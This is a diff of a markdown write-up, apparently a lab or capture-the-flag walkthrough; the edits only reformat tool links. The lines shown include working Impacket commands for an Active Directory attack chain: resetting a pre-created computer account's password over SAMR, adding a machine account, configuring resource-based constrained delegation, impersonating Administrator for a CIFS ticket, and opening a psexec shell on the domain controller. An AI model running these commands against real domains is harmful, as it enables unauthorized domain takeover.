@@ -206,7 +206,7 @@ SMB         10.10.10.3      445    DC01             [-] cascadetrust.local\ms01$
 
 We received the `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` error, which is different from the `STATUS_LOGON_FAILURE` error returned for an incorrect password. This indicates that the computer account exists in Active Directory but has not yet been used by a machine to establish a domain trust.
 
-In this state, the account’s password is considered expired, but we can still change it without an authenticated session using the SAMR protocol. We can use `[changepasswd](https://github.com/fortra/impacket/blob/master/examples/changepasswd.py)`, a Python script from [Impacket](https://github.com/fortra/impacket), with the `rpc-samr` option to change the password through the SAMR interface.
+In this state, the account’s password is considered expired, but we can still change it without an authenticated session using the SAMR protocol. We can use [changepasswd](https://github.com/fortra/impacket/blob/master/examples/changepasswd.py), a Python script from [Impacket](https://github.com/fortra/impacket), with the `rpc-samr` option to change the password through the SAMR interface.
 
 ```bash
 $ impacket-changepasswd -p rpc-samr cascadetrust.local/'MS01$':ms01@10.10.10.3 -newpass 'P@ssword123!'
@@ -420,7 +420,7 @@ MAQ         10.10.10.3      389    DC01             MachineAccountQuota: 10
 ```
 {: .nolineno}
 
-From our attack chain earlier, we already compromised MS01$, we can either use that or create a new account to perform this attack. I’ll create a new one to show how it works. We’ll use `[addcomputer](https://github.com/fortra/impacket/blob/master/examples/addcomputer.py)` python script from Impacket.
+From our attack chain earlier, we already compromised MS01$, we can either use that or create a new account to perform this attack. I’ll create a new one to show how it works. We’ll use [addcomputer](https://github.com/fortra/impacket/blob/master/examples/addcomputer.py) python script from Impacket.
 
 ```bash
 $ impacket-addcomputer 'cascadetrust.local/nathan.cole:Aar0n!Brooks_Help26' -computer-name 'CASCDEV$' -computer-pass 'CascDev@2026!' -dc-ip 10.10.10.3
@@ -429,7 +429,7 @@ Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 ```
 {: .nolineno}
 
-The new computer is added successfully now we’ll modify the delegation rights, configuring RBCD on new computer account. We’ll use `[rbcd](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)` script from Impkacet for this step.
+The new computer is added successfully now we’ll modify the delegation rights, configuring RBCD on new computer account. We’ll use [rbcd](https://github.com/fortra/impacket/blob/master/examples/rbcd.py) script from Impkacet for this step.
 
 ```bash
 $ impacket-rbcd -action write -delegate-from 'CASCDEV$' -delegate-to 'DC01$' -dc-ip 10.10.10.3 'cascadetrust.local/nathan.cole:Aar0n!Brooks_Help26'                                                                             
@@ -453,7 +453,7 @@ Before doing so, it is important to understand that a Kerberos service ticket is
 
 The resulting CIFS service ticket is valid for the CIFS service on `DC01`; it cannot be used to authenticate to other services running on the same computer, such as HTTP or LDAP. If we wanted to access one of those services, we would need to request a service ticket for the corresponding service principal.
 
-To request the Administrator’s CIFS service ticket using RBCD, we will use Impacket’s `[getST](https://github.com/fortra/impacket/blob/master/examples/getST.py)` script. The request is made using the computer account we control, such as `CASCDEV$`, which has been configured as a trusted principal for RBCD on `DC01`.
+To request the Administrator’s CIFS service ticket using RBCD, we will use Impacket’s [getST](https://github.com/fortra/impacket/blob/master/examples/getST.py) script. The request is made using the computer account we control, such as `CASCDEV$`, which has been configured as a trusted principal for RBCD on `DC01`.
 
 ```bash
 $ impacket-getST -spn 'cifs/DC01.cascadetrust.local' -impersonate Administrator -dc-ip 10.10.10.3 'cascadetrust.local/CASCDEV$:CascDev@2026!'
@@ -481,7 +481,7 @@ Once it’s set we can use **klist** command to list the tickets.
 
 Notice that the service principal in the ticket is `CIFS`. CIFS is the SMB file-sharing service, so the ticket is specifically for the SMB service running on `DC01`.
 
-With a valid Administrator service ticket for CIFS on `DC01`, we can use tools such as `[psexec](https://github.com/fortra/impacket/blob/master/examples/psexec.py)` from Impacket to authenticate to the SMB service and obtain an Administrator shell on `DC01`.
+With a valid Administrator service ticket for CIFS on `DC01`, we can use tools such as [psexec](https://github.com/fortra/impacket/blob/master/examples/psexec.py) from Impacket to authenticate to the SMB service and obtain an Administrator shell on `DC01`.
 
 ```bash
 $ impacket-psexec -k -no-pass 'cascadetrust.local/Administrator@DC01.cascadetrust.local' 
